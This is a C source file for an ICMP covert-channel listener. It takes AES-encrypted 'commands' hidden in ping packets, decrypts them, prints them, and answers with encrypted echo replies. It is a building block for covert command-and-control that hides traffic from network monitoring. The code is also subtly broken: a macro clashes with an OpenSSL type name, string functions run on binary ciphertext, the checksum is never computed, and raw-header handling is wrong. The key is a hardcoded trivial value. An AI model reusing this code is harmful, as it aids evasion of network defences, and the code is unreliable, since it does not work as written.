#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/select.h>

#define AES_KEY "0123456789abcdef"
#define BUFFER_SIZE 1024

// Padding for AES
char* pad(char* s) {
    int pad_len = AES_BLOCK_SIZE - strlen(s) % AES_BLOCK_SIZE;
    char* padded = malloc(strlen(s) + pad_len + 1);
    strcpy(padded, s);
    memset(padded + strlen(s), pad_len, pad_len);
    padded[strlen(s) + pad_len] = '\0';
    return padded;
}

char* unpad(char* s) {
    int pad_len = s[strlen(s) - 1];
    char* unpadded = malloc(strlen(s) - pad_len + 1);
    strncpy(unpadded, s, strlen(s) - pad_len);
    unpadded[strlen(s) - pad_len] = '\0';
    return unpadded;
}

// AES Encryption
char* aes_encrypt(char* raw, char* key) {
    char* padded = pad(raw);
    unsigned char iv[AES_BLOCK_SIZE];
    RAND_bytes(iv, AES_BLOCK_SIZE);
    AES_KEY enc_key;
    AES_set_encrypt_key((unsigned char*)key, 128, &enc_key);
    unsigned char* ciphertext = malloc(strlen(padded));
    AES_cfb128_encrypt((unsigned char*)padded, ciphertext, strlen(padded), &enc_key, iv, NULL, AES_ENCRYPT);

    char* output = malloc(AES_BLOCK_SIZE + strlen((char*)ciphertext));
    memcpy(output, iv, AES_BLOCK_SIZE);
    memcpy(output + AES_BLOCK_SIZE, ciphertext, strlen((char*)ciphertext));
    
    free(padded);
    free(ciphertext);
    return output;
}

// AES Decryption
char* aes_decrypt(char* enc, char* key) {
    unsigned char iv[AES_BLOCK_SIZE];
    memcpy(iv, enc, AES_BLOCK_SIZE);
    unsigned char* ciphertext = (unsigned char*)(enc + AES_BLOCK_SIZE);
    int ciphertext_len = strlen(enc) - AES_BLOCK_SIZE;

    AES_KEY dec_key;
    AES_set_decrypt_key((unsigned char*)key, 128, &dec_key);
    unsigned char* plaintext = malloc(ciphertext_len + 1);
    AES_cfb128_encrypt(ciphertext, plaintext, ciphertext_len, &dec_key, iv, NULL, AES_DECRYPT);
    plaintext[ciphertext_len] = '\0';

    char* unpadded = unpad((char*)plaintext);
    free(plaintext);
    return unpadded;
}

// Create ICMP Socket
int create_icmp_socket() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }
    int opt = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    return sock;
}

// Receive ICMP
int receive_icmp(int sock, char* buffer, struct sockaddr_in* addr) {
    socklen_t addr_len = sizeof(struct sockaddr_in);
    int bytes = recvfrom(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr*)addr, &addr_len);
    if (bytes <= 0) {
        perror("Recvfrom failed");
        return -1;
    }
    return bytes;
}

// Send ICMP
int send_icmp(int sock, char* message, struct sockaddr_in* addr) {
    struct icmp icmp_hdr;
    memset(&icmp_hdr, 0, sizeof(icmp_hdr));
    icmp_hdr.icmp_type = ICMP_ECHOREPLY;
    icmp_hdr.icmp_code = 0;
    icmp_hdr.icmp_id = getpid();
    icmp_hdr.icmp_seq = 1;
    icmp_hdr.icmp_cksum = 0;

    char buffer[BUFFER_SIZE];
    memset(buffer, 0, BUFFER_SIZE);
    memcpy(buffer, &icmp_hdr, sizeof(icmp_hdr));
    strcpy(buffer + sizeof(icmp_hdr), message);
    icmp_hdr.icmp_cksum = 0; // Add checksum calculation here
    memcpy(buffer, &icmp_hdr, sizeof(icmp_hdr));

    int bytes = sendto(sock, buffer, sizeof(icmp_hdr) + strlen(message), 0, (struct sockaddr*)addr, sizeof(struct sockaddr_in));
    if (bytes <= 0) {
        perror("Sendto failed");
        return -1;
    }
    return bytes;
}

// Calculate ICMP Checksum
unsigned short calc_checksum(unsigned short* ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    unsigned short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (unsigned short)~sum;
    return answer;
}

int main() {
    char* key = AES_KEY;
    int sock = create_icmp_socket();
    if (sock < 0) {
        return 1;
    }

    while (1) {
        char buffer[BUFFER_SIZE];
        struct sockaddr_in addr;
        int bytes = receive_icmp(sock, buffer, &addr);
        if (bytes > 0) {
            struct icmp* icmp_hdr = (struct icmp*)(buffer + sizeof(struct iphdr));
            if (icmp_hdr->icmp_type == ICMP_ECHO) {
                char* data = buffer + sizeof(struct iphdr) + sizeof(struct icmp);
                char* decrypted_message = aes_decrypt(data, key);
                printf("Received from %s: %s\n", inet_ntoa(addr.sin_addr), decrypted_message);
                char* response_message = "Command received";
                char* encrypted_response = aes_encrypt(response_message, key);
                send_icmp(sock, encrypted_response, &addr);
                free(decrypted_message);
                free(encrypted_response);
            }
        }
    }

    close(sock);
    return 0;
}
